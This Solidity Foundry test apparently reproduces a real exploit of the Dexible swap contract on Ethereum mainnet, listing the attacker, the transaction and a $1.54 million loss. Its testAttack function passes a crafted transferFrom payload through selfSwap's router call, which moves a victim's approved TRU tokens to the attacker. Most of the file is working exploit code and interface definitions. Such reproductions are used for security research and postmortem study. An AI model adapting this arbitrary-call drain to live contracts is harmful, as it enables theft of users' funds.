pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./interface/cheat.sol";
import "./interface/IERC20.sol";

//
// Total Lost: $1,541,048
// Chain: ETH
// Attacker: 0x684083f312ac50f538cc4b634d85a2feafaab77a
// Attack Contract: 0x194fc30f9eeba9ad673413629b47fc00e71d90df
// Attack Tx: 0x138daa4cbeaa3db42eefcec26e234fc2c89a4aa17d6b1870fc460b2856fd11a6
// Vulnerable Contract: 0xDE62E1b0edAa55aAc5ffBE21984D321706418024(proxy)  0x33e690aEa97E4Ef25F0d140F1bf044d663091DAf

contract DexibleExp is Test {
    CheatCodes constant cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    IERC20 TRU = IERC20(0x4C19596f5aAfF459fA38B0f7eD92F11AE6543784);
    IDexible Dexible = IDexible(0xDE62E1b0edAa55aAc5ffBE21984D321706418024);
    address victim = 0x58f5F0684C381fCFC203D77B2BbA468eBb29B098;
    address attacker = 0x684083F312Ac50f538Cc4B634d85a2feafaAB77a;

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_646_022);
        deal(address(USDC), address(this), 1_000_000);
    }

    function testAttack() public {
        TokenTypes.TokenAmount memory _tokenIn = TokenTypes.TokenAmount({amount: 14_403_789, token: address(USDC)});
        TokenTypes.TokenAmount memory _tokenOut = TokenTypes.TokenAmount({amount: 0, token: address(USDC)});
        TokenTypes.TokenAmount memory _routeAmount = TokenTypes.TokenAmount({amount: 0, token: address(TRU)});

        SwapTypes.RouterRequest[] memory _routes = new SwapTypes.RouterRequest[](1);
        _routes[0].router = address(TRU);
        _routes[0].spender = address(Dexible);
        _routes[0].routeAmount = _routeAmount;
        _routes[0].routerData =
            hex"23b872dd00000000000000000000000058f5f0684c381fcfc203d77b2bba468ebb29b098000000000000000000000000684083f312ac50f538cc4b634d85a2feafaab77a00000000000000000000000000000000000000000000000000066189a9f3b980";

        SwapTypes.SelfSwap memory data =
            SwapTypes.SelfSwap({feeToken: address(USDC), tokenIn: _tokenIn, tokenOut: _tokenOut, routes: _routes});

        console2.log("before attack...");
        console2.log("The balance of victim: ", TRU.balanceOf(address(victim)));
        console2.log("The balance of attacker: ", TRU.balanceOf(address(attacker)));

        USDC.approve(address(Dexible), type(uint256).max);
        console2.log("approve...");

        Dexible.selfSwap(data);

        console2.log("after attack...");
        console2.log("The balance of victim: ", TRU.balanceOf(address(victim)));
        console2.log("The balance of attacker: ", TRU.balanceOf(address(attacker)));
    }
}

interface IDexible {
    function addRelays(address[] memory relays) external;

    function adminMultiSig() external view returns (address);

    function arbitrumGasOracle() external view returns (address);

    function communityVault() external view returns (address);

    function configure(DexibleStorage.DexibleConfig memory config) external;

    function dxblToken() external view returns (address);

    function fill(SwapTypes.SwapRequest memory request, SwapHandler.SwapMeta memory meta)
        external
        returns (SwapHandler.SwapMeta memory);

    function initialize(DexibleStorage.DexibleConfig memory config) external;

    function minBpsRate() external view returns (uint16);

    function minFeeUSD() external view returns (uint112);

    function pause() external;

    function removeRelay(address relay) external;

    function resume() external;

    function revshareSplitRatio() external view returns (uint8);

    function selfSwap(SwapTypes.SelfSwap memory request) external;

    function setArbitrumGasOracle(address oracle) external;

    function setCommunityVault(address vault) external;

    function setMinBpsRate(uint16 bps) external;

    function setMinFeeUSD(uint112 minFee) external;

    function setRevshareSplitRatio(uint8 bps) external;

    function setStdBpsRate(uint16 bps) external;

    function setStdGasAdjustmentContract(address con) external;

    function setTreasury(address t) external;

    function stdBpsRate() external view returns (uint16);

    function stdGasAdjustmentContract() external view returns (address);

    function swap(SwapTypes.SwapRequest memory request) external;

    function treasury() external view returns (address);

    function withdraw(uint256 amount) external;
}

interface DexibleStorage {
    struct DexibleConfig {
        uint8 revshareSplitRatio;
        uint16 stdBpsRate;
        uint16 minBpsRate;
        address adminMultiSig;
        address communityVault;
        address treasury;
        address dxblToken;
        address arbGasOracle;
        address stdGasAdjustment;
        uint112 minFeeUSD;
        address[] initialRelays;
    }
}

interface SwapTypes {
    struct SwapRequest {
        ExecutionTypes.ExecutionRequest executionRequest;
        TokenTypes.TokenAmount tokenIn;
        TokenTypes.TokenAmount tokenOut;
        RouterRequest[] routes;
    }

    struct RouterRequest {
        address router;
        address spender;
        TokenTypes.TokenAmount routeAmount;
        bytes routerData;
    }

    struct SelfSwap {
        address feeToken;
        TokenTypes.TokenAmount tokenIn;
        TokenTypes.TokenAmount tokenOut;
        RouterRequest[] routes;
    }
}

interface ExecutionTypes {
    struct ExecutionRequest {
        address requester;
        FeeDetails fee;
    }

    struct FeeDetails {
        address feeToken;
        address affiliate;
        uint256 affiliatePortion;
    }
}

interface TokenTypes {
    struct TokenAmount {
        uint112 amount;
        address token;
    }
}

interface SwapHandler {
    struct SwapMeta {
        bool feeIsInput;
        bool isSelfSwap;
        address preSwapVault;
        uint256 startGas;
        uint256 toProtocol;
        uint256 toRevshare;
        uint256 outToTrader;
        uint256 outAmount;
        uint256 bpsAmount;
        uint256 gasAmount;
        uint256 nativeGasAmount;
        uint256 preDXBLBalance;
        uint256 inputAmountDue;
    }
}
